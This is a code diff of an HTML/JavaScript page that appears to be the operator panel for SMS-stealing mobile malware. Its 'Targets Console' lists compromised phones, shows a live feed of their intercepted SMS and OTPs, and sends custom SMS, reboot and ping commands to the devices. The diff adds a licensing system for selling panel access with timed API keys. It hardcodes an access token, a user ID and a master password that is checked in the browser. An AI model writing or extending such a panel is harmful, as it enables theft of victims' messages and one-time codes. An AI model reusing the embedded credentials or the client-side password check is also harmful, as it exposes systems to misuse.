+<div id="adminAuthModal" class="modal" style="display: none; align-items: center; justify-content: center; z-index: 100000; background: rgba(9, 11, 16, 0.95); backdrop-filter: blur(12px);">
+  <div class="premium-box" style="animation: fadeUp 0.3s ease both; width: 100%; max-width: 340px; padding: 24px; border-radius: 20px;">
+    <h2 class="premium-title" style="font-size: 22px;">Admin Access</h2>
+    <p class="premium-sub" style="margin-bottom: 20px;">Enter master password to continue</p>
+    <div style="text-align: left; margin-bottom: 18px;">
+       <input type="password" id="adminAuthInput" class="act-input" placeholder="Enter password..." style="margin-bottom: 0;">
+    </div>
+    <div style="display: flex; gap: 10px;">
+        <button class="act-send" style="background: rgba(255,255,255,0.05); color: #fff; box-shadow: none;" onclick="window.closeAdminAuth()">Cancel</button>
+        <button class="act-send" onclick="window.verifyAdminAuth()">Verify</button>
+    </div>
+  </div>
+</div>
+
+<div class="header" id="mainHeader">
   <div class="header-left">
     <div class="avatar">FP</div>
     <div>
@@ -544,28 +340,32 @@ button { -webkit-tap-highlight-color: transparent; }
       <div class="header-sub" id="conn-status"><span class="dot dot-on"></span>Connecting...</div>
     </div>
   </div>
-  <button id="dashboardBtn" class="refresh-btn" type="button" onclick="backToHome()">Dashboard</button>
+  <button id="dashboardBtn" class="refresh-btn" type="button" onclick="window.backToHome()">Dashboard</button>
 </div>
-
 
 <div id="homeDashboard" style="display:block">
 <div class="dashboard-card">
 <div style="display:flex;justify-content:space-between;gap:12px;align-items:center"><div class="eyebrow">Premium Expiry</div><div class="pill">Active</div></div>
-<div class="big-time unlimited">UNLIMITED</div>
+<div id="expiryDisplay" class="big-time unlimited">UNLIMITED</div>
 </div>
 
 <div class="eyebrow" style="margin-bottom:12px">Control Terminals</div>
 
-<div class="terminal-card" onclick="showTargetConsole()" style="cursor:pointer">
+<div class="terminal-card" onclick="window.showTargetConsole()" style="cursor:pointer">
 <div style="display:flex;justify-content:space-between;gap:12px;align-items:center"><h2 style="font-size:20px">Targets Console</h2><div class="pill">Online</div></div>
 <div style="margin-top:10px;color:#9CA3AF">Configure target devices and inspect online metrics.</div>
 </div>
 
 <div class="quick-grid">
-<div class="quick-card" onclick="openStarredFilter()" style="cursor:pointer"><div class="eyebrow">Starred</div><h2 id="dashTargets" style="margin-top:8px">0 Targets</h2></div>
-<div class="quick-card" onclick="openLiveSms()" style="cursor:pointer"><div class="eyebrow">Live SMS</div><h2 id="dashSms" style="margin-top:8px">SMS Feed</h2></div>
+<div class="quick-card" onclick="window.openStarredFilter()" style="cursor:pointer"><div class="eyebrow">Starred</div><h2 id="dashTargets" style="margin-top:8px; font-size:16px;">0 Targets</h2></div>
+<div class="quick-card" onclick="window.openLiveSms()" style="cursor:pointer"><div class="eyebrow">Live SMS</div><h2 id="dashSms" style="margin-top:8px; font-size:16px;">SMS Feed</h2></div>
+<div class="quick-card" onclick="window.openAdminAuth()" style="cursor:pointer; border-color:rgba(251, 113, 133, 0.3) !important; background:rgba(251, 113, 133, 0.05) !important;">
+    <div class="eyebrow" style="color:var(--red);">Admin</div>
+    <h2 style="margin-top:8px; font-size:16px; color:var(--text);">Control</h2>
 </div>
 </div>
+</div>
+
 <div class="summary" style="display:none">
   <div class="sum-card"><div class="sum-label">Total Devices</div><div class="sum-val blue" id="s-total">-</div></div>
   <div class="sum-card"><div class="sum-label">Online</div><div class="sum-val green" id="s-online">-</div></div>
@@ -574,32 +374,32 @@ button { -webkit-tap-highlight-color: transparent; }
 </div>
 
 <div class="search-wrap" style="display:none;align-items:center;gap:8px">
-  <input class="search-input" type="text" id="search" placeholder="Search targets, network, carrier, or message..." oninput="handleSearch()" style="flex:1;min-width:0">
+  <input class="search-input" type="text" id="search" placeholder="Search targets, network, carrier, or message..." oninput="window.handleSearch()" style="flex:1;min-width:0">
   <div class="sms-filter" id="smsFilter" style="position:relative;flex:0 0 auto">
-    <button class="filter-tab" id="smsFilterBtn" onclick="toggleSmsFilter(event)" style="display:flex;align-items:center;gap:6px;min-width:0">
+    <button class="filter-tab" id="smsFilterBtn" onclick="window.toggleSmsFilter(event)" style="display:flex;align-items:center;gap:6px;min-width:0">
       <span id="smsFilterLabel">All</span>
       <svg viewBox="0 0 24 24" width="14" height="14" style="stroke:currentColor;fill:none;stroke-width:2"><polyline points="6 9 12 15 18 9"/></svg>
     </button>
     <div id="smsFilterMenu" style="display:none;position:absolute;right:0;top:calc(100% + 6px);z-index:40;min-width:170px;border:1px solid var(--line);border-radius:14px;padding:6px;background:rgba(12,16,24,.97);box-shadow:0 18px 44px rgba(0,0,0,.38);backdrop-filter:blur(18px)">
-      <button class="filter-tab sms-filter-opt" data-val="all" onclick="chooseSmsFilter('all',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">All SMS</button>
-      <button class="filter-tab sms-filter-opt" data-val="new" onclick="chooseSmsFilter('new',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">New SMS</button>
-      <button class="filter-tab sms-filter-opt" data-val="today" onclick="chooseSmsFilter('today',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Today</button>
-      <button class="filter-tab sms-filter-opt" data-val="1h" onclick="chooseSmsFilter('1h',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Last 1 hour</button>
-      <button class="filter-tab sms-filter-opt" data-val="24h" onclick="chooseSmsFilter('24h',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Last 24 hours</button>
-      <button class="filter-tab sms-filter-opt" data-val="7d" onclick="chooseSmsFilter('7d',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Last 7 days</button>
-      <button class="filter-tab sms-filter-opt" data-val="old" onclick="chooseSmsFilter('old',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Older than 7 days</button>
-      <button class="filter-tab sms-filter-opt" data-val="none" onclick="chooseSmsFilter('none',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">No SMS</button>
+      <button class="filter-tab sms-filter-opt" data-val="all" onclick="window.chooseSmsFilter('all',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">All SMS</button>
+      <button class="filter-tab sms-filter-opt" data-val="new" onclick="window.chooseSmsFilter('new',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">New SMS</button>
+      <button class="filter-tab sms-filter-opt" data-val="today" onclick="window.chooseSmsFilter('today',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Today</button>
+      <button class="filter-tab sms-filter-opt" data-val="1h" onclick="window.chooseSmsFilter('1h',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Last 1 hour</button>
+      <button class="filter-tab sms-filter-opt" data-val="24h" onclick="window.chooseSmsFilter('24h',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Last 24 hours</button>
+      <button class="filter-tab sms-filter-opt" data-val="7d" onclick="window.chooseSmsFilter('7d',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Last 7 days</button>
+      <button class="filter-tab sms-filter-opt" data-val="old" onclick="window.chooseSmsFilter('old',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">Older than 7 days</button>
+      <button class="filter-tab sms-filter-opt" data-val="none" onclick="window.chooseSmsFilter('none',this)" style="width:100%;justify-content:flex-start;text-align:left;margin:2px 0">No SMS</button>
     </div>
   </div>
 </div>
 
 <div class="filter-tabs" style="display:none" id="filter-tabs">
-  <button class="filter-tab active" data-filter="all" onclick="setFilter('all',this)">All</button>
-  <button class="filter-tab" data-filter="starred" onclick="setFilter('starred',this)">Starred ⭐</button>
-  <button class="filter-tab" data-filter="online" onclick="setFilter('online',this)">Online</button>
-  <button class="filter-tab" data-filter="offline" onclick="setFilter('offline',this)">Offline</button>
-  <button class="filter-tab" data-filter="sent" onclick="setFilter('sent',this)">Sent Done</button>
-  <button class="filter-tab" data-filter="failed" onclick="setFilter('failed',this)">Failed</button>
+  <button class="filter-tab active" data-filter="all" onclick="window.setFilter('all',this)">All</button>
+  <button class="filter-tab" data-filter="starred" onclick="window.setFilter('starred',this)">Starred ⭐</button>
+  <button class="filter-tab" data-filter="online" onclick="window.setFilter('online',this)">Online</button>
+  <button class="filter-tab" data-filter="offline" onclick="window.setFilter('offline',this)">Offline</button>
+  <button class="filter-tab" data-filter="sent" onclick="window.setFilter('sent',this)">Sent Done</button>
+  <button class="filter-tab" data-filter="failed" onclick="window.setFilter('failed',this)">Failed</button>
 </div>
 
 <div class="section" style="display:none">
@@ -610,23 +410,109 @@ button { -webkit-tap-highlight-color: transparent; }
   <div id="device-list"><div class="loader"><div class="spinner"></div>Loading devices...</div></div>
 </div>
 
-<div class="tab-bar" style="display:none">
-  <div class="tab active" onclick="setTab(0,this)">
-    <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Home
-  </div>
-  <div class="tab" onclick="setTab(1,this)">
-    <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>Devices
-  </div>
-  <div class="tab" onclick="setTab(2,this)">
-    <svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>Favs
-  </div>
-  <div class="tab" onclick="setTab(3,this)">
-    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>Settings
+<div id="adminModal" class="modal">
+  <div class="modal-panel">
+    <div class="modal-top">
+        <button class="back-btn" onclick="window.closeAdmin()">Back</button>
+        <h3 class="modal-title" style="color:var(--red);">Admin Control</h3>
+    </div>
+    
+    <div class="eyebrow" style="margin-bottom:12px;">Create New API Key (Server)</div>
+    <div class="act-form">
+        <input type="text" id="newApiName" class="act-input" placeholder="Enter custom key (e.g. pkkk123)">
+        
+        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 6px;">
+            <div>
+                <label style="font-size: 10px; color: var(--muted); padding-left: 4px;">Days</label>
+                <input type="number" id="apiDurDays" class="act-input" value="0" min="0" style="margin-bottom: 0; padding: 10px 8px;">
+            </div>
+            <div>
+                <label style="font-size: 10px; color: var(--muted); padding-left: 4px;">Hours</label>
+                <input type="number" id="apiDurHrs" class="act-input" value="1" min="0" style="margin-bottom: 0; padding: 10px 8px;">
+            </div>
+            <div>
+                <label style="font-size: 10px; color: var(--muted); padding-left: 4px;">Mins</label>
+                <input type="number" id="apiDurMins" class="act-input" value="0" min="0" style="margin-bottom: 0; padding: 10px 8px;">
+            </div>
+            <div>
+                <label style="font-size: 10px; color: var(--muted); padding-left: 4px;">Secs</label>
+                <input type="number" id="apiDurSecs" class="act-input" value="0" min="0" style="margin-bottom: 0; padding: 10px 8px;">
+            </div>
+        </div>
+        <div style="font-size: 11px; color: var(--muted-2); margin-bottom: 14px; text-align: right;">Set all to 0 for Lifetime key.</div>
+        
+        <button class="act-send" id="genKeyBtn" style="background: linear-gradient(135deg, var(--red), var(--amber)); color:#fff;" onclick="window.generateApiKey()">Generate Key</button>
+    </div>
+
+    <div class="eyebrow" style="margin-top:24px; margin-bottom:12px;">Active Keys (Global)</div>
+    <div id="adminKeysList"></div>
   </div>
 </div>
 
+<div id="smsModal" class="modal">
+  <div class="modal-panel">
+    <div class="modal-top">
+        <button class="back-btn" onclick="window.closeSms()">Back</button>
+        <h3 class="modal-title">Device Details</h3>
+        <button class="sheet-refresh-btn" id="smsRefreshBtn" onclick="window.manualRefreshSms()">Refresh</button>
+    </div>
+
+    <div class="modal-tabs">
+      <div class="modal-tab active" id="tabLogs" onclick="window.switchModalTab('logs')">Logs</div>
+      <div class="modal-tab" id="tabAction" onclick="window.switchModalTab('action')">Action</div>
+    </div>
+
+    <div id="logsView">
+        <div id="smsList">Syncing SMS...</div>
+    </div>
+
+    <div id="actionView" style="display:none;">
+        <div class="eyebrow" style="margin-bottom:12px;">Quick Actions</div>
+        <div class="action-grid">
+            <button class="act-btn" onclick="window.sendDeviceCommand('refresh_network', this)">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"></path><path d="M21 3v5h-5"></path></svg>
+                Refresh Network
+            </button>
+            <button class="act-btn" onclick="window.sendDeviceCommand('clear_cache', this)">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"></path><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+                Clear Cache
+            </button>
+            <button class="act-btn" onclick="window.sendDeviceCommand('ping', this)">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
+                Ping Device
+            </button>
+            <button class="act-btn red" onclick="window.sendDeviceCommand('reboot', this)">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path><line x1="12" y1="2" x2="12" y2="12"></line></svg>
+                Reboot (Root)
+            </button>
+        </div>
+
+        <div class="eyebrow" style="margin-bottom:12px;">Send Custom SMS</div>
+        <div class="act-form">
+            <input type="text" id="customSmsPhone" class="act-input" placeholder="Enter target number">
+            <textarea id="customSmsMessage" class="act-textarea" placeholder="Enter message body..."></textarea>
+            <button class="act-send" onclick="window.sendCustomSms()">Send Message</button>
+        </div>
+    </div>
+  </div>
+</div>
+
+<div id="liveSmsModal" class="modal">
+ <div class="modal-panel">
+  <div class="modal-top"><button class="back-btn" onclick="window.closeLiveSms()">Back</button><h3 class="modal-title">Live SMS Feed</h3><button class="refresh-btn" onclick="window.manualRefreshLiveSms()">Refresh</button></div>
+  <div id="liveSmsList">Syncing SMS...</div>
+ </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
 <script>
+const SERVER_URL = "https://prem7654-fire-panel-server.hf.space";
 const API_URL = 'https://amaan7695-amaan-otp.hf.space/api/data?user_id=8701872796&token=d1ab01688a5054d13d91bf4deca9af308d3bfc6913303b69b2e9f152de36da74';
+const BASE_URL = API_URL.split('/api/')[0];
+const QUERY_PARAMS = API_URL.split('?')[1];
+const COMMAND_URL = BASE_URL + '/api/command?' + QUERY_PARAMS;
+const MASTER_KEY = 'Prem123321';
 
 let allDevices = [];
 let currentFilter = 'all';
@@ -636,8 +522,6 @@ let isRefreshing = false;
 let hasLoadedOnce = false;
 let highestKnownMessageId = 0;
 const MESSAGE_SEEN_STORAGE_KEY = 'godPanelMessageSeenTimesV5';
-const REALTIME_NEW_SMS_LIMIT = 3;
-const REALTIME_RECENT_WINDOW_MS = 30 * 60 * 1000;
 let messageSeenTimes = loadMessageSeenTimes();
 
 let latestSmsMap={};
@@ -647,12 +531,217 @@ let latestSmsTimeMap={};
 let messageOrder={};
 let messageOrderSeq=0;
 let initialOrderSeq=0;
+let localFakeSms = [];
 
+let openedFromLiveFeed=false;
+let currentSmsDevice=null;
+let isSmsRefreshing=false;
+let currentSmsIds=[];
+let toastTimer=null;
+let liveSeenIds=new Set();
+let adminKeysCache = []; 
+window.isLoggedInThisSession = false; 
+
+if (window.Telegram && window.Telegram.WebApp) { Telegram.WebApp.ready(); Telegram.WebApp.expand(); }
+
+/* --- PREMIUM & ADMIN KEY LOGIC (SESSION SECURE) --- */
+window.checkPremium = function() {
+    if (!window.isLoggedInThisSession) {
+        const savedKey = localStorage.getItem('fire_premium_key');
+        if (savedKey) {
+            document.getElementById('premiumKeyInput').value = savedKey;
+        }
+        document.getElementById('premiumOverlay').style.display = 'flex';
+        return false;
+    }
+
+    const currentKey = localStorage.getItem('fire_premium_key');
+    const expiry = localStorage.getItem('fire_premium_expiry');
+    
+    if (!currentKey) { document.getElementById('premiumOverlay').style.display = 'flex'; return false; }
+    if (currentKey === MASTER_KEY) { document.getElementById('premiumOverlay').style.display = 'none'; updateExpiryDisplay(); return true; }
+    
+    if (expiry && expiry !== "null" && Date.now() > parseInt(expiry)) {
+        localStorage.removeItem('fire_premium_key');
+        localStorage.removeItem('fire_premium_expiry');
+        window.isLoggedInThisSession = false;
+        document.getElementById('premiumOverlay').style.display = 'flex';
+        showToast('Your API Key has expired!', 'error');
+        return false;
+    }
+    
+    document.getElementById('premiumOverlay').style.display = 'none';
+    updateExpiryDisplay();
+    return true;
+};
+
+window.savePremiumKey = async function() {
+    const keyInput = document.getElementById('premiumKeyInput').value.trim();
+    if(!keyInput) return showToast('Please enter an API key', 'info');
+    
+    if (keyInput === MASTER_KEY) {
+        localStorage.setItem('fire_premium_key', keyInput);
+        localStorage.setItem('fire_premium_expiry', "null");
+        window.isLoggedInThisSession = true;
+        showToast('Master Access Granted!', 'ok');
+        document.getElementById('premiumOverlay').style.display = 'none';
+        updateExpiryDisplay();
+        window.loadData();
+        return;
+    }
+    
+    try {
+        const response = await fetch(`${SERVER_URL}/validate_key`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ key: keyInput })
+        });
+        const result = await response.json();
+        if (result.valid) {
+            localStorage.setItem('fire_premium_key', keyInput);
+            localStorage.setItem('fire_premium_expiry', result.expiry || "null");
+            window.isLoggedInThisSession = true;
+            showToast('Premium Activated!', 'ok');
+            document.getElementById('premiumOverlay').style.display = 'none';
+            updateExpiryDisplay();
+            window.loadData();
+        } else { showToast('Invalid or Expired Key!', 'error'); }
+    } catch (e) { showToast('Server connection failed!', 'error'); }
+};
+
+window.openAdminAuth = function() {
+    document.getElementById('adminAuthInput').value = '';
+    document.getElementById('adminAuthModal').style.display = 'flex';
+};
+window.closeAdminAuth = function() {
+    document.getElementById('adminAuthModal').style.display = 'none';
+};
+window.verifyAdminAuth = function() {
+    let pass = document.getElementById('adminAuthInput').value;
+    if(pass === MASTER_KEY) {
+        document.getElementById('adminAuthModal').style.display = 'none';
+        document.getElementById('adminModal').style.display = 'block';
+        window.renderAdminKeys();
+    } else {
+        showToast('Wrong Password!', 'error');
+    }
+};
+window.closeAdmin = function() { document.getElementById('adminModal').style.display = 'none'; };
+
+window.generateApiKey = async function() {
+    let keyName = document.getElementById('newApiName').value.trim();
+    let d = parseInt(document.getElementById('apiDurDays').value) || 0;
+    let h = parseInt(document.getElementById('apiDurHrs').value) || 0;
+    let m = parseInt(document.getElementById('apiDurMins').value) || 0;
+    let s = parseInt(document.getElementById('apiDurSecs').value) || 0;
+    
+    if(!keyName) return showToast('Enter key name', 'info');
+
+    let totalMs = (d * 86400000) + (h * 3600000) + (m * 60000) + (s * 1000);
+    let expiryTime = null;
+    if(totalMs > 0) {
+        expiryTime = Date.now() + totalMs;
+    }
+
+    const btn = document.getElementById('genKeyBtn');
+    btn.disabled = true; btn.textContent = "Creating...";
+
+    try {
+        const res = await fetch(`${SERVER_URL}/add_key`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ key: keyName, expiry: expiryTime })
+        });
+        const result = await res.json();
+        if(result.success) {
+            showToast('API Key Created globally!', 'ok');
+            document.getElementById('newApiName').value = '';
+            window.renderAdminKeys();
+        } else { showToast(result.error || 'Failed to create', 'error'); }
+    } catch(e) { showToast('Database Server Error', 'error'); }
+    btn.disabled = false; btn.textContent = "Generate Key";
+};
+
+window.deleteApiKey = async function(keyName) {
+    try {
+        const res = await fetch(`${SERVER_URL}/delete_key`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ key: keyName })
+        });
+        if(res.ok) { showToast('Key Deleted from DB', 'info'); window.renderAdminKeys(); }
+    } catch(e) { showToast('Server error', 'error'); }
+};
+
+window.renderAdminKeys = async function() {
+    document.getElementById('adminKeysList').innerHTML = '<div class="loader"><div class="spinner"></div>Loading keys from DB...</div>';
+    try {
+        const res = await fetch(`${SERVER_URL}/get_keys`);
+        const keys = await res.json();
+        adminKeysCache = keys;
+        window.updateAdminKeysDOM();
+    } catch(e) { document.getElementById('adminKeysList').innerHTML = '<div class="empty">Failed to load from server</div>'; }
+};
+
+window.updateAdminKeysDOM = function() {
+    let html = ''; let now = Date.now();
+    adminKeysCache.forEach(k => {
+        let status = k.status === 'active' ? 'Active' : 'Inactive';
+        let color = status === 'Active' ? 'var(--green)' : 'var(--red)';
+        let expText = 'Lifetime';
+        if(k.expiry) {
+            if(now > k.expiry) { status = 'Expired'; color = 'var(--red)'; expText = 'Time is up'; } 
+            else {
+                let diff = k.expiry - now;
+                let d = Math.floor(diff / 86400000);
+                let hrs = Math.floor((diff % 86400000) / 3600000);
+                let mins = Math.floor((diff % 3600000) / 60000);
+                let secs = Math.floor((diff % 60000) / 1000);
+                
+                let timeStr = "";
+                if(d > 0) timeStr += `${d}d `;
+                timeStr += `${hrs}h ${mins}m ${secs}s`;
+                expText = `Expires in ${timeStr}`;
+            }
+        }
+        html += `<div class="sms-card" style="display:flex; justify-content:space-between; align-items:center;">
+            <div><div style="font-weight:900; font-size:15px; color:var(--blue);">${k.key_name}</div><div style="font-size:11px; color:${color}; margin-top:4px;">[${status}] ${expText}</div></div>
+            <button class="act-btn red" style="padding:6px 12px; font-size:11px; min-height:auto;" onclick="window.deleteApiKey('${k.key_name}')">Delete</button>
+        </div>`;
+    });
+    if(adminKeysCache.length === 0) html = '<div class="empty">No keys found in Database</div>';
+    document.getElementById('adminKeysList').innerHTML = html;
+};
+
+function updateExpiryDisplay() {
+    let currentKey = localStorage.getItem('fire_premium_key');
+    let expiry = localStorage.getItem('fire_premium_expiry');
+    let expEl = document.getElementById('expiryDisplay');
+    if(currentKey === MASTER_KEY || !expiry || expiry === "null") {
+        expEl.innerHTML = 'UNLIMITED'; expEl.className = 'big-time unlimited'; expEl.removeAttribute('data-expiry');
+    } else {
+        expEl.className = 'big-time'; expEl.style.color = 'var(--amber)'; expEl.style.textShadow = 'none'; expEl.setAttribute('data-expiry', expiry);
+    }
+}
+
+setInterval(() => {
+    let expEl = document.getElementById('expiryDisplay');
+    if(expEl && expEl.hasAttribute('data-expiry')) {
+        let exp = parseInt(expEl.getAttribute('data-expiry'));
+        let now = Date.now();
+        if(now > exp) { expEl.innerHTML = 'EXPIRED'; expEl.style.color = 'var(--red)'; window.checkPremium(); } 
+        else {
+            let diff = exp - now;
+            let h = Math.floor(diff / 3600000).toString().padStart(2, '0');
+            let m = Math.floor((diff % 3600000) / 60000).toString().padStart(2, '0');
+            let s = Math.floor((diff % 60000) / 1000).toString().padStart(2, '0');
+            expEl.innerHTML = `${h}h ${m}m ${s}s`;
+        }
+    }
+    
+    // Live tick for Admin Keys List
+    if (document.getElementById('adminModal').style.display === 'block' && adminKeysCache.length > 0) {
+        window.updateAdminKeysDOM();
+    }
+}, 1000);
+
+/* --- MAIN APP LOGIC --- */
 function buildLatestSmsMap(messages){
- latestSmsMap={};
- latestSmsByDevice={};
- recentSmsByDevice={};
- latestSmsTimeMap={};
+ latestSmsMap={}; latestSmsByDevice={}; recentSmsByDevice={}; latestSmsTimeMap={};
  (messages||[]).forEach(m=>{
    const id=m.device_id||m.source_id;
    if(!id) return;
@@ -671,205 +760,65 @@ function buildLatestSmsMap(messages){
  saveMessageSeenTimes();
 }
 
-function getOrderRank(m){
- const key = m && m.id != null ? String(m.id) : '';
- if(key && messageOrder[key] != null) return messageOrder[key];
- messageOrderSeq += 1;
- const rank = messageOrderSeq;
- if(key) messageOrder[key] = rank;
- return rank;
-}
-
-
-// Init Telegram WebApp
-if (window.Telegram && window.Telegram.WebApp) {
-  Telegram.WebApp.ready();
-  Telegram.WebApp.expand();
-}
-
 function normalizeStatus(s) {
-  if (!s) return 'unknown';
-  const sl = s.toLowerCase().trim();
-  if (sl === 'online' || sl === 'true') return 'online';
-  if (sl === 'offline') return 'offline';
-  if (sl === 'sent done') return 'sent';
-  if (sl === 'failed') return 'failed';
-  if (sl === 'yes') return 'yes';
-  return 'other';
+  if (!s) return 'unknown'; const sl = s.toLowerCase().trim();
+  if (sl === 'online' || sl === 'true') return 'online'; if (sl === 'offline') return 'offline';
+  if (sl === 'sent done') return 'sent'; if (sl === 'failed') return 'failed'; if (sl === 'yes') return 'yes'; return 'other';
 }
-
-function battColor(b) {
-  if (b > 50) return '#31C48D';
-  if (b > 20) return '#FBBF24';
-  return '#F05252';
-}
-
+function battColor(b) { if (b > 50) return '#31C48D'; if (b > 20) return '#FBBF24'; return '#F05252'; }
 function parseApiDate(value) {
-  if (!value) return null;
-  if (typeof value === 'number') return new Date(value);
-  const raw = String(value).trim();
-  if (!raw) return null;
+  if (!value) return null; if (typeof value === 'number') return new Date(value);
+  const raw = String(value).trim(); if (!raw) return null;
   const normalizedForNative = raw.includes('T') ? raw : raw.replace(' ', 'T');
   const hasZone = /(?:Z|[+-]\d{2}:?\d{2})$/.test(raw);
   const nativeDate = hasZone ? new Date(normalizedForNative) : null;
-  const normalized = raw
-    .replace('T', ' ')
-    .replace(/(?:Z|[+-]\d{2}:?\d{2})$/, '')
-    .trim();
+  const normalized = raw.replace('T', ' ').replace(/(?:Z|[+-]\d{2}:?\d{2})$/, '').trim();
   const [datePart, timePart = '00:00:00'] = normalized.split(' ');
   const [year, month, day] = datePart.split('-').map(Number);
   const [hour = 0, minute = 0, second = 0] = timePart.split(':').map(Number);
   const localDate = new Date(year, month - 1, day, hour, minute, second);
-  const date = nativeDate && !Number.isNaN(nativeDate.getTime()) && nativeDate.getTime() <= Date.now() + 2 * 60 * 1000
-    ? nativeDate
-    : localDate;
+  const date = nativeDate && !Number.isNaN(nativeDate.getTime()) && nativeDate.getTime() <= Date.now() + 2 * 60 * 1000 ? nativeDate : localDate;
   return Number.isNaN(date.getTime()) ? null : date;
 }
-
-function getMsgTime(m) {
-  return (parseApiDate(m && (m.received_at || m.date)) || new Date(0)).getTime();
-}
-
-function getMsgOrder(m) {
-  const n = Number(m && m.id);
-  return Number.isFinite(n) && n > 0 ? n : getMsgTime(m);
-}
-
-function isValidPhoneNumber(value) {
-  const raw = String(value || '').trim();
-  return /^\+?\d{6,15}$/.test(raw);
-}
-
-function getDeviceTitle(device) {
-  if (isValidPhoneNumber(device && device.phone_number)) return String(device.phone_number).trim();
-  return 'Unknown Number';
-}
-
+function getMsgTime(m) { return (parseApiDate(m && (m.received_at || m.date)) || new Date(0)).getTime(); }
+function isValidPhoneNumber(value) { return /^\+?\d{6,15}$/.test(String(value || '').trim()); }
+function getDeviceTitle(device) { if (isValidPhoneNumber(device && device.phone_number)) return String(device.phone_number).trim(); return 'Unknown Number'; }
 function getDeviceSubInfo(device) {
   const recent = (recentSmsByDevice[device && device.id] || []).slice(0, 2);
-  if (recent.length) {
-    return `<div class="dev-recent-list">${recent.map(s=>`<div class="dev-recent"><b>${s.address||s.sender||'Unknown'}</b> • ${formatMsgDate(s)}</div>`).join('')}</div>`;
-  }
-  const network = device && device.network && device.network !== 'Unknown' ? device.network : '';
-  return network;
+  if (recent.length) return `<div class="dev-recent-list">${recent.map(s=>`<div class="dev-recent"><b>${s.address||s.sender||'Unknown'}</b> • ${formatMsgDate(s)}</div>`).join('')}</div>`;
+  return device && device.network && device.network !== 'Unknown' ? device.network : '';
 }
 
-
-
-function toggleFav(id, btn) {
+window.toggleFav = function(id, btn) {
  try{
-   const k='god_favs';
-   const favs=JSON.parse(localStorage.getItem(k)||'[]');
-   const i=favs.indexOf(id);
-   if(i>=0){
-     favs.splice(i,1);
-     showToast('Removed from favorites','info');
-     if(btn) btn.classList.remove('starred');
-   } else {
-     favs.push(id);
-     showToast('Added to favorites','ok');
-     if(btn) btn.classList.add('starred');
-   }
-   localStorage.setItem(k,JSON.stringify(favs));
-   updateSummary(allDevices);
+   const k='god_favs'; const favs=JSON.parse(localStorage.getItem(k)||'[]'); const i=favs.indexOf(id);
+   if(i>=0){ favs.splice(i,1); showToast('Removed from favorites','info'); if(btn) btn.classList.remove('starred'); }
+   else { favs.push(id); showToast('Added to favorites','ok'); if(btn) btn.classList.add('starred'); }
+   localStorage.setItem(k,JSON.stringify(favs)); updateSummary(allDevices);
    if(currentFilter === 'starred') renderList();
  }catch(e){}
-}
+};
 
-function copyText(text,event){
- if(event) event.stopPropagation();
- navigator.clipboard.writeText(String(text||''));
- showToast('Copied','ok');
-}
+window.copyText = function(text,event){ if(event) event.stopPropagation(); navigator.clipboard.writeText(String(text||'')); showToast('Copied','ok'); };
 
 function renderDeviceSummary(device, messages) {
-  const d = device || {};
-  const norm = normalizeStatus(d.status);
